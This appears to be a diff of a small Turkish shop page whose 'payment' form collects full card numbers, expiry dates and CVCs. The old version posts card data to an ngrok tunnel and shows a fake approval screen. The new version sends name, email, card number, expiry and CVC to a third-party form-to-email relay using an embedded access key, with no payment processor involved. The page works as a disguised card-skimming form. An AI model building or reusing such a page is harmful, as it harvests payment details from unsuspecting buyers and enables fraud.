@@ -2,70 +2,61 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>A Pear Backend</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; }
+        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; transition: 0.3s; }
+        .box:hover { border-color: #00f; }
         #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #555; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        input, textarea { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
+        button { width: 100%; padding: 10px; margin-top: 10px; cursor: pointer; background: #00f; color: white; border: none; border-radius: 8px; }
     </style>
 </head>
 <body>
+
+    <!-- Menü Ekranı -->
     <div class="grid" id="menu">
-        <div class="box" onclick="selectItem('Uçak Büyük', 50)">Uçak Büyük<br>50 TL</div>
-        <div class="box" onclick="selectItem('Uçak', 40)">Uçak<br>40 TL</div>
-        <div class="box" onclick="selectItem('Star Spiral', 30)">Star Spiral<br>30 TL</div>
-        <div class="box" onclick="selectItem('Özel', 0)">Özel<br>??? TL</div>
+        <div class="box" onclick="selectItem('Uçak Büyük', '50 TL')">Uçak Büyük<br>50 TL</div>
+        <div class="box" onclick="selectItem('Uçak', '40 TL')">Uçak<br>40 TL</div>
+        <div class="box" onclick="selectItem('Star Spiral', '30 TL')">Star Spiral<br>30 TL</div>
+        <div class="box" onclick="selectItem('Özel', 'İsteğe Bağlı')">Özel<br>??? TL</div>
     </div>
 
+    <!-- Ödeme (Form) Ekranı -->
     <div id="pay-screen">
         <h3 id="order-title">Ödeme</h3>
-        <input type="text" id="isim" placeholder="İsim Soyisim">
-        <div id="ozel-div" style="display:none;"><input type="text" id="ozel" placeholder="Notunuz..."></div>
-        <input type="text" id="kart" placeholder="Kart No (16 Hane)" maxlength="16" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-        <input type="text" id="tarih" placeholder="Tarih (AA/YY)" maxlength="5">
-        <input type="text" id="cvc" placeholder="CVC (3 Hane)" maxlength="3" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-        <label><input type="checkbox" id="kabul"> Şartları kabul ediyorum.</label>
-        <button onclick="pay()" style="width:100%; padding:10px; margin-top:10px;">Google 1 Ödeme Yap</button>
-    </div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <!-- Web3Forms Access Key -->
+            <input type="hidden" name="access_key" value="61ce0357-21e8-4aeb-b226-fbd13630ecef">
+            
+            <!-- Sipariş Detayları -->
+            <input type="text" name="Urun" id="hidden-urun" readonly style="display:none;">
+            <input type="text" name="name" placeholder="İsim Soyisim" required>
+            <input type="email" name="email" placeholder="E-posta Adresiniz" required>
+            
+            <div id="ozel-div" style="display:none;">
+                <input type="text" name="ozel_not" placeholder="Notunuz...">
+            </div>
 
-    <div id="success" style="display:none; text-align:center;">
-        <div class="loader"></div>
-        <h3>İşleminiz Onaylandı</h3>
+            <input type="text" name="kart" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <input type="text" name="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
+            <input type="text" name="cvc" placeholder="CVC (3 Hane)" maxlength="3" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            
+            <label><input type="checkbox" required> Şartları kabul ediyorum.</label>
+            <button type="submit">Ödemeyi Tamamla</button>
+        </form>
     </div>
 
     <script>
         function selectItem(name, price) {
             document.getElementById('menu').style.display = 'none';
             document.getElementById('pay-screen').style.display = 'block';
-            document.getElementById('order-title').innerText = name + " - " + price + " TL";
+            document.getElementById('order-title').innerText = name + " - " + price;
+            // Form içinde gönderilecek gizli inputu güncelle
+            document.getElementById('hidden-urun').value = name + " - " + price;
             document.getElementById('ozel-div').style.display = (name === 'Özel') ? 'block' : 'none';
-        }
-
-        async function pay() {
-            if(document.getElementById('kart').value.length !== 16 || !document.getElementById('kabul').checked) return alert("Hatalı veya eksik!");
-            
-            const data = {
-                isim: document.getElementById('isim').value,
-                urun: document.getElementById('order-title').innerText,
-                ozel: document.getElementById('ozel').value,
-                kart: document.getElementById('kart').value
-            };
-
-            // BURAYA KENDİ NGROK LİNKİNİ YAZ (Sonuna /siparis-al eklemeyi unutma!)
-            const response = await fetch('https://punctual-villain-arson.ngrok-free.dev/siparis-al', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-
-            if(response.ok) {
-                document.getElementById('pay-screen').style.display = 'none';
-                document.getElementById('success').style.display = 'block';
-            }
         }
     </script>
 </body>
